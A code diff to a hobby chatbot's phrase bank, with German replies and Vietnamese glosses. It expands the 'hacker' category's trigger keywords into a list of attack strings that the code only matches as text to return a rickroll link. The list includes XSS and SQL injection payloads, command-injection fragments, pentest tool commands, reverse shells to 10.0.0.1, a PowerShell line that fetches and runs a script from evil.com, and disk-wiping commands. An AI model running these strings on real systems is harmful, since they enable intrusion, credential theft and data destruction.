@@ -117,15 +117,12 @@ const CONFIG = {
 
 const phraseBank = [
   { name: "xinchao",  
-    keywords: ["chao","hi","bonjour","hello","cc","hola","hallo", "wtf"],
+    keywords: ["chao","hi","bonjour","hello","cc","hola","hallo", "wtf", ":)"],
     // Dùng hàm để mỗi lần gọi entries() nó tự bốc ngẫu nhiên 1 cái
     entries: () => getRandom([
       { reply: "Hallo, was ist der neu?", vi: "Chàoo, có gì mới à?" },
       { reply: "Ah, du bist wieder da.", vi: "À, cậu lại đến rồi." },
       { reply: "Willkommen zurück.", vi: "Chào mừng trở lại." },
-      { reply: "Hmmmm... this really not rickroll:", 
-      linkUrl: "https://youtu.be/dQw4w9WgXcQ", 
-      vi:"No chac chan khph rickroll."}
     ])
   },
  { 
@@ -146,16 +143,62 @@ const phraseBank = [
   },
   { 
     name: "hacker",   
-    keywords: ["hack","pentest","mat khau","password","may tinh"],
+    keywords: [
+    // 1. Hack & Web Injection (XSS, SQLi, Command Injection)
+    "hack",
+    "<script>",
+    "<img src=x onerror=alert('hack')>",
+    "javascript:alert(document.cookie)",
+    "admin' OR '1'='1",
+    "' UNION SELECT NULL, username, password FROM users--",
+    "; cat /etc/passwd",
+    "| id",
+    "`whoami`",
+
+    // 2. Pentest & Reconnaissance (Lệnh & Công cụ)
+    "pentest",
+    "nmap -sV -p- 192.168.1.1",
+    "gobuster dir -u http://target.com -w words.txt",
+    "nikto -h http://target.com",
+    "sqlmap -u 'http://target.com/page?id=1' --batch",
+    "hydra -l admin -P pass.txt ssh://192.168.1.1",
+    "msfconsole",
+    "burpsuite",
+    "wireshark",
+
+    // 3. Mật khẩu & Passwords (Dạng băm, bẻ khóa, chuỗi mẫu)
+    "mat khau",
+    "password",
+    "123456",
+    "password123",
+    "admin123",
+    "john --wordlist=rockyou.txt hash.txt",
+    "hashcat -m 0 -a 0 hash.txt rockyou.txt",
+    "5f4dcc3b5aa765d61d8327deb882cf99", // md5 of "password"
+    "$2a$12$e8N...",
+
+    // 4. Máy tính & Shell Execution (Reverse shell, Remote execution)
+    "may tinh",
+    "nc -e /bin/sh 10.0.0.1 4444",
+    "python3 -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"10.0.0.1\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
+    "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\"",
+    "cmd.exe /c calc.exe",
+    "rm -rf / --no-preserve-root",
+    "format C: /Q /Y"
+  ],
     entries: () => getRandom([
-      { reply: "Oh.", vi: "Ngầu à nhen." },
-      { reply: "Sicherheit ist nur eine Illusion.", vi: "Bảo mật chỉ là một sự ảo tưởng thôi." }
+      { reply: "Hmmmm... this really not rickroll:", 
+      linkUrl: "https://youtu.be/dQw4w9WgXcQ", 
+      vi:"No chac chan khph rickroll."}
     ])
   }
 ];
+
 const fallbackBank = [   // dùng khi không danh mục nào khớp
-  { reply: "...", vi: "..." }, { reply: "?", vi: "?" }, { reply: "!!", vi: "!!" },
-  { reply: "@@", vi: "Ok, then." }, { reply: "Hmmmm.", vi: "Hmmmmmmmmmm." }
+  { reply: "Hmmmm... this really not rickroll:", 
+    linkUrl: "https://youtu.be/dQw4w9WgXcQ", 
+    vi:"No chac chan khph rickroll."},
+  { reply: "Ok?", vi: "Ok?"}
 ];
 
 
